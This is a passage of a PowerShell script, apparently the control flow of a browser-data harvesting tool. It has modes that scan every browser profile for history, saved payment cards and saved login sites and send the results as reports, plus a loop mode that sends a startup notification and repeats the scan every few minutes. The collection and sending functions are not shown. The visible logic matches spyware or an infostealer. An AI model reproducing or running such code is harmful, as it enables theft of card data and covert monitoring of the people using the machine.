        try { Invoke-BrowserHistoryScan } catch { Add-Error "History scan failed: $($_.Exception.Message)" }
        try { Invoke-BrowserCardScan } catch { Add-Error "Card scan failed: $($_.Exception.Message)" }
        Send-HistoryReport -Force
    }
    Save-State
    exit 0
}

if ($CardReport) {
    Write-Console 'Running the saved payment-card report...'
    Invoke-ForEachProfile {
        try { Invoke-BrowserCardScan } catch { Add-Error "Card scan failed: $($_.Exception.Message)" }
        [void](Send-CardReport -Force -Full)
    }
    Save-State
    exit 0
}

if ($LoginReport) {
    Write-Console 'Running the saved-login site-URL report...'
    Invoke-ForEachProfile {
        try { Invoke-BrowserLoginScan } catch { Add-Error "Login scan failed: $($_.Exception.Message)" }
        [void](Send-LoginReport -Force -Full)
    }
    Save-State
    exit 0
}

if ($Loop) {
    Send-StartupNotification
    Write-Console "Continuous monitoring mode — scanning every $Script:IntervalMinutes minute(s). (Ctrl+C to stop)" -ForegroundColor Cyan
    while ($true) {
        $cycleStart = Get-Date
        try { Invoke-FullScan } catch { Write-Log "Unexpected error in the cycle: $($_.Exception.Message)" 'ERROR' }
        $elapsed = (Get-Date) - $cycleStart
        $sleep = ($Script:IntervalMinutes * 60) - [int]$elapsed.TotalSeconds
        if ($sleep -lt 10) { $sleep = 10 }
        Write-Log "Sleeping $sleep second(s) until the next cycle..."
        Start-Sleep -Seconds $sleep
    }
}
else {
    Invoke-FullScan
    exit 0
}
